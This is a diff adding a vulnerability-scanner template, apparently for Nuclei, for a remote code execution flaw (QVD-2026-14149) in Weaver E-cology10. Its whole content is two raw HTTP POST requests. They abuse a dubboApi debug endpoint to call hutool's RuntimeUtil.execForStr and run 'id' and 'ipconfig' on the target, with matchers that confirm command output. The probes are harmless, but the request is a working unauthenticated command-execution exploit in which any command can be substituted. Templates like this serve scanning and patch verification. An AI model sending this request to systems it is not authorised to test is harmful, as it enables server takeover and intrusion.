@@ -1,0 +1,56 @@
+id: weaver-ecology-v10-dubboApi-debug-method-rce
+info:
+  name: 泛微E-cology10 远程代码执行漏洞()
+  author: leadlife
+  severity: critical
+  description: 泛微E-cology10 远程代码执行漏洞(QVD-2026-14149)，攻击者可执行任意命令导致服务器被控
+  reference: 
+    - https://github.com/SourByte05/Vulnerability-Wiki-PoC/blob/cd7d9b337116506097ce5f724619d1849b0b9000/2026/03/%E6%B3%9B%E5%BE%AEE-cology10%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(QVD-2026-14149)/%E6%B3%9B%E5%BE%AEE-cology10%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(QVD-2026-14149).md
+  classification:
+    cve-id: QVD-2026-14149
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: rce,weaver,ecology
+
+http:
+  - raw:
+      - |
+        POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        [["id"]]
+
+
+      - |
+        POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        [["ipconfig"]]
+        
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Windows IP"
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+        condition: or
+
+      - type: status
+        status:
+          - 200
